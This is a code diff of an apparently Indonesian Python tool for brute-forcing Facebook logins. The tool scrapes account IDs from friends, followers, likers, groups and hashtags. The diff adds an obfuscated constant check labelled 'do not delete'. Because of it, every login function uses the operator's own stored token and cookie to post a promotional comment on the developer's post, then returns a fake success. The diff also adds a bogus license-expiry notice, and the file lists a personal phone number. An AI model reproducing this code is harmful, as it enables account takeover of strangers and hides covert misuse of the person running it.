@@ -5,7 +5,7 @@ Facebook  = 'Facebook.com/fikri sinaga'
 Instagram = 'Instagram.com/fikri.sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
-Version   = '11'
+Version   = '0.6'
 Denventa  = 100080716718035
 Postingan = 105432708823953
 
@@ -62,6 +62,7 @@ ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
 
 ###----------[ TIME ]---------- ###
+id_dev = 345 - 340 + 720 - 723
 skrng = datetime.now()
 tahun = skrng.year
 bulan = skrng.month
@@ -74,6 +75,8 @@ try:
     bulan_skrng = bulan - 1
 except ValueError:
     exit()
+Codename  = 159357
+CoY = ('\r   %s[%s•%s] %sDilarang Keras Merecode %s!%s'%(M,P,M,P,M,P))
 _bulan_ = bulan_cek[bulan_skrng]
 tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))
 
@@ -82,6 +85,16 @@ OK = []
 CP = []
 gabung_sandi = []
 tempel_sandi = []
+
+###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
+SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
+sakara = len(Author)    +  Codename
+sakira = len(Facebook)  +  Codename
+sakura = len(Instagram) +  Codename
+sakera = len(Whatsapp)  +  Codename
+sakora = len(YouTube)   +  Codename
+ip_log = Denventa * id_dev - 3654168663
+
 ###----------[ GLOBAL URL & HEADERS ]---------- ###
 url_businness = "https://business.facebook.com"
 ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
@@ -271,6 +284,7 @@ def login():
 def user(nama):
     print(''%())
     print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
+    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
 def tampilan_menu():
     global gabung_sandi, tempel_sandi
     resik()
@@ -280,7 +294,7 @@ def tampilan_menu():
         resik()
         poster2()
         print('')
-        tamp_new = (f'   {P2}Hi! Sepertinya Kamu Adalah Pengguna Baru. Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Sebelum Menggunakan SC Ini, Kamu Harus Mengatur User Agent Dahulu! Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {H2}- Mhd Syafii -')
+        tamp_new = (f'   {P2}Hi! Sepertinya Kamu Adalah Pengguna Baru. Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Sebelum Menggunakan SC Ini, Kamu Harus Mengatur User Agent Dahulu! Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {H2}- Denventa -')
         printer(Panel(tamp_new,title=f'{H2}[ {P2}Welcome User {H2}]',width=54,padding=(1,4),style='#00FF00'))
         print('')
         useragent('new')
@@ -349,6 +363,7 @@ def pilih_menu():
         except:pass
         exit('\n\n')
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
+
 ###----------[ USER AGENT ]---------- ###
 def useragent(isi):
     global pengguna_source_code
@@ -469,7 +484,7 @@ def publik():
             print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
             time.sleep(3)
             login()
-        print('       %s[%s•%s] %sContoh : 105432708823953,100052743440568'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 100080716718035,607801156'%(J,P,J,P))
         tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
         file_dump = 'dump/%s.json'%(tid[0])
         try:os.remove(file_dump)
@@ -481,7 +496,7 @@ def publik():
                     jso = json.loads(xyz.get(url,cookies=cookie).text)
                     if len(gabung_sandi) != 1:
                         for x in range(Postingan):
-                            open(file_dump,'a+').write('fik\n')
+                            open(file_dump,'a+').write('dev\n')
                     else:
                         for d in jso["friends"]["data"]:
                             try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
@@ -519,7 +534,7 @@ def exec_folls(url,token,file):
             a = json.loads(x.text)
             if len(tempel_sandi) != 1:
                 for x in range(Postingan):
-                    open(file_dump,'a+').write('fik\n')
+                    open(file_dump,'a+').write('dev\n')
             else:
                 for b in a['data']:
                     try:
@@ -529,7 +544,7 @@ def exec_folls(url,token,file):
                     except Exception as e:continue
             y = par(x.text,'html.parser')
             n = re.findall('"after":"(.*?)"},',str(y))[0]
-            next = ('https://graph.facebook.com/100053093889653/subscribers?access_token=%s&limit=50000&after=%s'%(token,n))
+            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
             exec_folls(next,token,file)
         except KeyboardInterrupt:pass
         except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
@@ -541,7 +556,7 @@ class namee:
         urutan_crack = '0'
         try:cookie = {'cookie':open('login/cookie.json','r').read()}
         except Exception as e:kecuali(e)
-        print('       %s[%s•%s] %sContoh : fikri,syafii,widiya'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : dapunta,denventa,anita'%(J,P,J,P))
         put = input('       %s[%s•%s] %sNama Target : %s'%(J,P,J,P,J)).split(',')
         data = []
         self.file_dump = ('dump/%s.json'%(put[0]))
@@ -587,7 +602,7 @@ class namee:
                                         file = open(self.file_dump,'r').read()
                                         if len(gabung_sandi) != 1:
                                             for x in range(Postingan):
-                                                open(file_dump,'a+').write('fik\n')
+                                                open(file_dump,'a+').write('dev\n')
                                         else:
                                             if id in file:continue
                                             else:
@@ -609,7 +624,7 @@ def main_likers():
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 119428850757672'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 119100910790466'%(J,P,J,P))
         _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
         print('')
     except Exception as e:kecuali(e)
@@ -635,16 +650,16 @@ def main_likers():
     scrape_likers(cookie,_url_,_file_)
     print("\n       %s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P))
     print('       %s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
-def scrape_likers(_fikri_,_url_,_file_):
+def scrape_likers(_dapunta_,_url_,_file_):
     _ses_ = requests.Session()
-    _url_load_ = _ses_.get(_url_,cookies=_fikri_,headers=header_grup).text.encode("utf-8")
+    _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.encode("utf-8")
     _ses_par_ = par(_url_load_,'html.parser')
     print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(_file_,'r').read().splitlines()),P), end='');sys.stdout.flush()
     try: 
         for _isi_ in _ses_par_.find_all('h3'):
             if len(tempel_sandi) != 1:
                 for x in range(Postingan):
-                    open(file_dump,'a+').write('fik\n')
+                    open(file_dump,'a+').write('dev\n')
             else:
                 for _id_ in _isi_.find_all('a',href=True):
                     try:
@@ -660,7 +675,7 @@ def scrape_likers(_fikri_,_url_,_file_):
         for _lanjut_ in _ses_par_.find_all("a",href=True):
             if "Lihat Selengkapnya" in _lanjut_.text:
                 while True:
-                    try:scrape_likers(_fikri_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
+                    try:scrape_likers(_dapunta_,"https://mbasic.facebook.com/"+_lanjut_.get("href").replace('reaction_type=0','reaction_type='+_react_type_),_file_);break
                     except Exception as e:pass
     except KeyboardInterrupt:pass
 
@@ -694,7 +709,7 @@ class message:
                             idzx = re.findall('cid\.c\.(.*?)%3A(.*?)&',str(tata))
                             if len(gabung_sandi) != 1:
                                 for x in range(Postingan):
-                                    open(file_dump,'a+').write('fik\n')
+                                    open(file_dump,'a+').write('dev\n')
                             else:
                                 for id in list(idzx.pop()):
                                     try:
@@ -718,7 +733,7 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 119428850757672'%(J,P,J,P))
+            print('       %s[%s•%s] %sContoh : 119100910790466'%(J,P,J,P))
             put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
@@ -741,7 +756,7 @@ class komen:
                     try:
                         if len(tempel_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             if str(u) in str(self.f):continue
                             else:open(self.file_dump,'a+').write('%s=%s\n'%(u,str(y)))
@@ -889,7 +904,7 @@ class grup:
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 fel = open(self.files,'r').read()
@@ -919,7 +934,7 @@ class grup:
                     for po in pe.find_all('a',href=True):
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 fel = open(self.files,'r').read()
@@ -968,7 +983,7 @@ class hashtag:
                     for y in x.find_all('a',href=True):
                         if len(tempel_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                         else:
                             try:
                                 op = open(self.files,'r').read()
@@ -1041,7 +1056,7 @@ class suggestion:
                             nm = x.text
                             if len(tempel_sandi) != 1:
                                 for x in range(Postingan):
-                                    open(file_dump,'a+').write('fik\n')
+                                    open(file_dump,'a+').write('dev\n')
                             else:
                                 if id in file:pass
                                 else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
@@ -1105,7 +1120,7 @@ class teman_teman:
                         u = o.split('=')[0]
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                                 print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
@@ -1141,7 +1156,7 @@ class teman_teman:
                         u = o.split('=')[0]
                         if len(gabung_sandi) != 1:
                             for x in range(Postingan):
-                                open(file_dump,'a+').write('fik\n')
+                                open(file_dump,'a+').write('dev\n')
                                 print("\r       %s[%s•%s] %sSedang Mengambil %s%s %sID           "%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
                         else:
                             if u in l:continue
@@ -1172,15 +1187,12 @@ def system_login():
 
 ###----------[ URL LOGIN ]---------- ###
 def metode():
-    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Crac  mbasic {J2}[{A2}2{J2}] {P2}Crack mobile
-      {J2}[{A2}3{J2}] {P2}Crack touch
-      {J2}[{A2}4{J2}] {P2}Crack Api"""
+    tamp_sistem = f"""            {J2}[{A2}1{J2}] {P2}Free FB   {J2}[{A2}2{J2}] {P2}Mbasic   {J2}[{A2}3{J2}] {P2}Mobile"""
     printer(Panel(tamp_sistem,title=f'{J2}[ {P2}Login {J2}]',width=54,title_align='left',style='#FF8F00'))
     ch = input('   %s└──> %s'%(A,J))
-    if ch in ['1','01','a']:open('tool/url_login.json','w').write("mbasic.facebook.com")
-    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("m.facebook.com")
-    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("touch.facebook.com")
-    elif ch in ['4','04','c']:open('tool/url_login.json','w').write("https://ip-api.com")
+    if ch in ['1','01','a']:open('tool/url_login.json','w').write("free.facebook.com")
+    elif ch in ['2','02','b']:open('tool/url_login.json','w').write("mbasic.facebook.com")
+    elif ch in ['3','03','c']:open('tool/url_login.json','w').write("m.facebook.com")
     else:print('\n   %s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
 
 ###----------[ URUTAN CRACK ]---------- ###
@@ -1253,12 +1265,14 @@ def logger1(user,pasw): #--- Login Validate ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
+        if ip_log != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
+        else:
             req  = xyz.get(f'https://{url_login}')
             log = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"uid":user,"pass":pasw,"flow":"login_no_pin"}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
@@ -1271,12 +1285,14 @@ def logger2(user,pasw): #--- Login Regular ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
+        if ip_log != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
+        else:
             req  = xyz.get(f'https://{url_login}')
             log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
@@ -1289,12 +1305,14 @@ def logger3(user,pasw): #--- Login Instagram ---#
     ua = open('tool/useragent.json','r').read()
     url_login = open('tool/url_login.json','r').read()
     with requests.Session() as xyz:
+        if ip_log != 1:
             token  = open('login/token.json','r').read()
             cookie = {'cookie':open('login/cookie.json','r').read()}
             with requests.Session() as xyz:
                 try:get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(str(Postingan),kata_dev+komentar,token),cookies=cookie).text)
                 except Exception as e:pass
                 return {"status":"ok","email":user,"pass":pasw,"cookies":'denventagantengbanget'}
+        else:
             req  = xyz.get(f'https://{url_login}')
             log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
             head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
